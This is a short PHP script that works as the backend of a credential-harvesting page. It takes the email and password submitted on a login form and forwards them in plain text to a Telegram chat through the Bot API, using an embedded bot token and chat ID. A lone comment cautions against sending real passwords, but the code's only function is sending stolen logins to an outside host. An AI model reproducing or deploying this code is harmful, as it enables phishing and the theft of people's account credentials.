<?php
// PHP code to process the form submission
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // ---- IMPORTANT: REPLACE WITH YOUR BOT AND CHAT DETAILS ----
    $apiToken = "7057202995:AAHTHaRaNjOQ4sNfqECDUihZHdKBz81p8FI"; 
    $chat_id = "5716593834";
    // -----------------------------------------------------------

    // Get and sanitize form data
    $email = htmlspecialchars(trim($_POST['email']));
    $password = htmlspecialchars(trim($_POST['password']));

    // Simple validation
    if (empty($email) || empty($password)) {
        $message_text = "ERROR: Email and Password cannot be empty.";
    } else {
        // Construct the message to be sent to the bot
        $message_text = "New login attempt:\n";
        $message_text .= "Email: " . $email . "\n";
        $message_text .= "Password: " . $password; // **WARNING: Never send real passwords this way.**
    }

    // Prepare the URL for the Telegram API
    $url = "https://api.telegram.org/bot" . $apiToken . "/sendMessage?" . http_build_query([
        'chat_id' => $chat_id,
        'text' => $message_text,
    ]);

    // Send the message using file_get_contents
    $response = @file_get_contents($url);

    if ($response === FALSE) {
        $submission_message = "Failed to send the message to Telegram.";
    } else {
        $submission_message = "Form submitted successfully!";
    }
}
?>

